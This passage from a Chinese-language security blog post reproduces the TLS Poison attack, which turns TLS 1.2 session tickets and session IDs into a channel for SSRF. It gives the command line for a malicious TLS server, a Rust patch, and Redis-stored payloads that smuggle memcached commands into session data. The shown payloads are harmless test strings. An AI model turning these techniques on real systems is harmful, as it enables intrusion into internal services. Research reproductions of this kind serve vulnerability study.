hQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/5.png" alt=""></p><p>可以看到这里 curl 不需要再经过多次重定向，只需要一次重定向就可以稳定进行 SSRF ，也不再需要依靠 DNS Rebinding 的稳定性了。</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-Ticket" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session Ticket"></a>Use The Optimization Method To Deal With TLS 1.2 Session Ticket</h3><p>尽管我们可以使用 TLS 1.3 PSK 进行 Session Resumption ，但是根据 <a href="https://caniuse.com/?search=tls%201.3" target="_blank" rel="noopener">https://caniuse.com/?search=tls%201.3</a> 的数据显示，目前 TLS 1.3 全球覆盖率为 91.12% ，而 TLS 1.2 的覆盖率为 98.4% ，并且目前淘宝、百度等知名主站均还没有完全支持 TLS 1.3 ，所以有些时候还是需要我们使用TLS 1.2 ，而作者又偷了一点懒，没有实现任何 TLS 1.2 相关的利用方式，而 @zhaojin 使用的 <a href="https://github.com/tlsfuzzer/tlslite-ng" target="_blank" rel="noopener">tlslite-ng</a> 目前还并未支持 TLS 1.2 当中的 Session Ticket ，而又正好作者修改的 <a href="https://github.com/ctz/rustls" target="_blank" rel="noopener">rustls</a> 实现的功能比较完善，所以我只能硬头皮刚了一波 rust ，为原作者的 TLSServer 增加了基于 TLS 1.2 Session Ticket 的修改功能。</p><p>依旧使用我修改的仓库 <a href="https://github.com/ZeddYu/TLS-poison" target="_blank" rel="noopener">https://github.com/ZeddYu/TLS-poison</a> ，对于 DNS Server setup 还是使用优化的双 A 记录的方法，但是对于 TLS Server setup 我们需要改变一下：</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11210 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/root/tls/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/root/tls/privkey.pem</span> <span class="hljs-params">--tickets</span> <span class="hljs-params">--protover</span> 1.2 http</span><br></pre></td></tr></tbody></table></figure><p></p><p>使用参数<code>--tickets</code>，允许 TLS Server 使用 Session Tickets 进行 Session Resumption ；使用<code>--protover 1.2</code>参数，只允许 TLS Server 最高使用 TLS 1.2 版本。并在 redis 设置 ticket_payload ，这个与之前设置的 payload 值一样，是用来对 memcached 进行利用的，我们这里就区别于之前随便设置一下就可以了，例如<code>set ticket_payload "\r\nset foo 0 0 41\nThis is a TLS 1.2 session ticket example.\r\n"</code></p><p>对于 Client ，我们不能再使用 curl ，因为其并没有实现 Ticket Session 插件…所以我选用了老版本 Chrome 70.0.3538.77 for Ubuntu 进行学习。（提醒这里不要用 Firefox ，因为作者在 PDF 中表示过 Firefox 没有这个“特性”）</p><p>依旧在 TLS Server 上使用 proxy.py ，接着确定准备好就可以在本地打开 chrome 访问自己 TLS Server 的地址：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/6.png" alt=""></p><p>因为 Chrome 的一个特殊机制，使用 Chrome 测试我们并不能像 curl 那样一次就能成功，这里我们最好使把 Chrome 的 Keep local data only until you quit your browser 选项打开以及设置每次打开 Chrome 时就打开我们的 TLS Server 地址，这样实验就比较方便了，多试几次我们就可以看到上图这个效果。</p><h3 id="Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID"><a href="#Use-The-Optimization-Method-To-Deal-With-TLS-1-2-Session-ID" class="headerlink" title="Use The Optimization Method To Deal With TLS 1.2 Session ID"></a>Use The Optimization Method To Deal With TLS 1.2 Session ID</h3><p>那要是遇到只能用 curl/libcurl ，而且 TLS 1.3 又不支持的情况，那就只能通过 TLS 1.2 Session ID 来实现我们注入 payload 实现 SSRF 了，我们能做的就是使用双 A 记录的方法来提高攻击稳定性。</p><p>由于作者写的不是很好，并没有对 TLS 1.2 进行适配，而我也并不熟悉 rust ，只能勉强找到作者代码库的问题，大概就是由于作者在 main.rs#730 循环中每次都使用了新的 config ，如下代码所示：</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">loop</span> {</span><br><span class="line">  poll.poll(&amp;<span class="hljs-keyword">mut</span> events, <span class="hljs-literal">None</span>)</span><br><span class="line">  .unwrap();</span><br><span class="line"></span><br><span class="line">  config = make_config(&amp;args, session_id_generator.clone());</span><br><span class="line">  tlsserv.tls_config = config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> events.iter() {</span><br><span class="line">    <span class="hljs-keyword">match</span> event.token() {</span><br><span class="line">      LISTENER =&gt; {</span><br><span class="line">        <span class="hljs-keyword">if</span> !tlsserv.accept(&amp;<span class="hljs-keyword">mut</span> poll) {</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      _ =&gt; tlsserv.conn_event(&amp;<span class="hljs-keyword">mut</span> poll, &amp;event)</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>导致了在 rustls/src/server/hs.rs#718 中每次根据<code>client_hello.session_id.get_encoding()</code>都取不到存储的 Session ID</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Perhaps resume?  If we received a ticket, the sessionid</span></span><br><span class="line"><span class="hljs-comment">// does not correspond to a real session.</span></span><br><span class="line"><span class="hljs-keyword">if</span> !client_hello.session_id.is_empty() &amp;&amp; !ticket_received {</span><br><span class="line">  <span class="hljs-keyword">let</span> maybe_resume = sess.config.session_storage</span><br><span class="line">  .get(&amp;client_hello.session_id.get_encoding())</span><br><span class="line">  .and_then(|x| persist::ServerSessionValue::read_bytes(&amp;x));</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> can_resume(sess, &amp;<span class="hljs-keyword">self</span>.handshake, &amp;maybe_resume) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.start_resumption(sess,</span><br><span class="line">      client_hello, sni.as_ref(),</span><br><span class="line">      &amp;client_hello.session_id,</span><br><span class="line">      maybe_resume.unwrap());</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以我们只需要把 main.rs#734 以下两行进行注释即可：</p><p></p><figure class="highlight rust hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// config = make_config(&amp;args, session_id_generator.clone());</span></span><br><span class="line"><span class="hljs-comment">// tlsserv.tls_config = config;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>虽然可以 debug 找到问题所在，但是并不能完美地修正这个问题，只能做个临时的处理办法来解决这个问题，而且自己时间精力并不太足够，所以如果有同学有比较好的办法解决这个问题欢迎提 PR 修正这个问题！</p><p>然后在 redis 中修改 payload 为 32 字节长度：<code>set payload "\r\nset foo 0 0 13\nI am so poor.\r\n"</code>。好了，那就让我们来试一下吧！</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/7.png" alt=""></p><p>虽然我们只能使用 32 字节的 Session ID ，但是对于 memcahed ，我们可以使用<code>append</code>命令进行追加，例如：<code>set payload "\nappend foo 0 0 11\nSo so poor.\r\n"</code>。并且因为我们注释了那两行，所以对于重新设置了的 payload ，我们需要重新启动一次 TLS Server </p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/8.png" alt=""></p><p>好了，以上就是我们关于 TLS Poison 漏洞复现的部分。</p><h3 id="Attack-Impact"><a href="#Attack-Impact" class="headerlink" title="Attack Impact"></a>Attack Impact</h3><p>在作者的报告中指出如下的 Client 对 TLS 会话进行了缓存：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/9.jpg" alt=""></p><p>作者还给出了在内网中易受攻击的服务：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKk